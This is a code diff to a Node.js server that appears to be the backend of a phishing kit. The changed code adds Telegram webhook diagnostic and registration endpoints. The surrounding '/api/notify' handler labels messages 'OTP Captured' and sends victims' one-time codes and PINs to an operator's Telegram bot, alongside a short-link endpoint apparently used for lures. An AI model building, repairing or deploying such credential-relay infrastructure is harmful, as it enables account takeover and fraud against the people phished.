@@ -163,6 +163,32 @@ app.get('/api/debug', (_req, res) => {
 });
 
 /* ============================================================
+   WEBHOOK DIAGNOSTIC — open this URL in browser to check
+   ============================================================ */
+app.get('/api/check-webhook', async (_req, res) => {
+  try {
+    const r = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
+    const d = await r.json();
+    res.json(d);
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+
+app.get('/api/set-webhook', async (_req, res) => {
+  try {
+    const publicUrl = (process.env.PUBLIC_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}`).replace(/\/+$/, '');
+    const webhookUrl = `${publicUrl}/api/telegram-webhook`;
+    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
+    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
+    const d = await r.json();
+    res.json({ webhookUrl, result: d });
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+
+/* ============================================================
    SHORT LINKS
    ============================================================ */
 app.post('/api/links', (req, res) => {
@@ -246,7 +272,7 @@ app.post('/api/notify', async (req, res) => {
           ]
         ]
       };
-    } else { // otp
+    } else {
       label = '🔢 <b>OTP Captured</b>';
       keyLabel = 'OTP';
       secretValue = otp || pinOrOtp || '—';
@@ -331,15 +357,22 @@ app.post('/api/telegram-webhook', async (req, res) => {
 });
 
 /* ============================================================
-   AUTO-REGISTER WEBHOOK
+   AUTO-REGISTER WEBHOOK — with allowed_updates
    ============================================================ */
 async function registerWebhook(){
-  const publicUrl = (process.env.PUBLIC_URL || `http://localhost:${PORT}`).replace(/\/+$/, '');
+  const publicUrl = (
+    process.env.PUBLIC_URL ||
+    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
+    `http://localhost:${PORT}`
+  ).replace(/\/+$/, '');
   const webhookUrl = `${publicUrl}/api/telegram-webhook`;
   console.log(`PUBLIC_URL = ${publicUrl}`);
   console.log(`Registering webhook: ${webhookUrl}`);
   try {
-    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
+    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
+    const r = await fetch(
+      `${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`
+    );
     const d = await r.json();
     console.log('setWebhook result:', d);
   } catch (e) {
